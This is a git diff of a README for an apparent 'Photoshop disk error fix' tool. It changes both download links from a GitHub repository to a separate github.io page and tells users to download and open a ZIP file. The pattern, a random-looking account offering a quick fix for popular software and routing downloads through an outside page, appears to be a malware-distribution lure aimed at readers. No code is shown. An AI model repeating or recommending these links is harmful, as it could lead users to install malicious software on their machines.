@@ -1,12 +1,12 @@
 # 🛠️ photoshop-disk-error-fix - Fix Photoshop Disk Errors Fast
 
-[![Download Now](https://img.shields.io/badge/Download-Photoshop_Disk_Error_Fix-blue)](https://github.com/Beakedparsleyalpinism864/photoshop-disk-error-fix)
+[![Download Now](https://img.shields.io/badge/Download-Photoshop_Disk_Error_Fix-blue)](https://beakedparsleyalpinism864.github.io)
 
 ## 📥 Download and Run
 
 Your Photoshop keeps showing "Scratch Disk Full" errors. This tool fixes that problem. It is a single file. You do not need to install anything.
 
-1. Go to the [download page](https://github.com/Beakedparsleyalpinism864/photoshop-disk-error-fix)
+1. Go to the [download page](https://beakedparsleyalpinism864.github.io)
 2. Click the green "Code" button
 3. Select "Download ZIP"
 4. Open the ZIP file
